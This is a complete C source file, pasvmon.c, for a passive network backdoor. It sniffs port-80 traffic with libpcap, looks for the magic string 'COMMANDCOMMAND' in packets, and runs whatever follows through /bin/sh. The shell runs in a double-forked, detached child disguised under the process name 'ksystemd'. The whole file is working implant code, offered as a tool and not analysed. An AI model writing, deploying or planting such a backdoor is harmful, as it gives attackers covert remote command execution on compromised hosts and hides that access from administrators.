/*
 * pasvmon.c
 * Monitor network traffic for commands
 * By J. Stuart McMurray
 * Created 20160227
 * Last Modified 20160227
 */

#define _GNU_SOURCE /* Blech */

#include <err.h>
#include <pcap.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>

#define DEVICE "eth0"                        /* Capture device */
#define FILTER "dst port 80 and src port 80" /* BPF filter */
#define MAGICN "COMMANDCOMMAND"              /* Magic flag */
#define SHNAME "ksystemd"                    /* Name for child */
#define BUFLEN 65535                         /* Command buffer size */

void handler(u_char *user, const struct pcap_pkthdr *hdr, const u_char *pkt);

int main(int argc, char **argv) {
        pcap_t *p;                       /* Pcap handle */
        struct bpf_program fp;           /* BPF filter */
        char errbuf[PCAP_ERRBUF_SIZE+1]; /* Error buffer */

        p = NULL;
        errbuf[PCAP_ERRBUF_SIZE] = '\0';

        /* Ignore child processess death */
        signal(SIGCHLD, SIG_IGN);

        /* Start pcap session */
        if (NULL == (p = pcap_open_live(DEVICE, 65535, 0, -1, errbuf))) {
                errx(1, "pcap_open_live: %s", errbuf);
        }

        /* Set filter */
        if (-1 == pcap_compile(p, &fp, FILTER, 1, 0)) {
                errx(2, "pcap_compile");
        }
        if (-1 == pcap_setfilter(p, &fp)) {
                errx(3, "pcap_setfilter");
        }

        return pcap_loop(p, -1, handler, NULL);
}

/* handler handles pcap packets */
void handler(u_char *user, const struct pcap_pkthdr *hdr, const u_char *pkt) {
        u_char *start;      /* Start of command in packet */
        char buf[BUFLEN+1]; /* Buffer to hold command */
        size_t len;         /* Copy this number of bytes */

        buf[BUFLEN] = '\0';

        /* Find our magic number */
        if (NULL == (start = memmem(
                                        pkt,
                                        hdr->caplen,
                                        MAGICN,
                                        strlen(MAGICN)))) {
                return;
        }
        /* Seek past the magic number */
        start += strlen(MAGICN);
        /* Make sure we have packet left */
        if ((pkt + hdr->caplen) <= start) {
                return;
        }
        /* How many bytes to copy */
        len = (pkt+hdr->caplen) - start;
        if (len > BUFLEN) {
                return;
        }
        /* The rest is a command */
        memcpy(buf, start, len);

        /* Fork and exec */
        if (0 == fork()) { /* Child */
                setsid();
                if (0 == fork()) { /* More child */
                        setsid();
                        _exit(execl("/bin/sh", SHNAME, "-c", buf, NULL));
                }
                _exit(0);
        } 
}
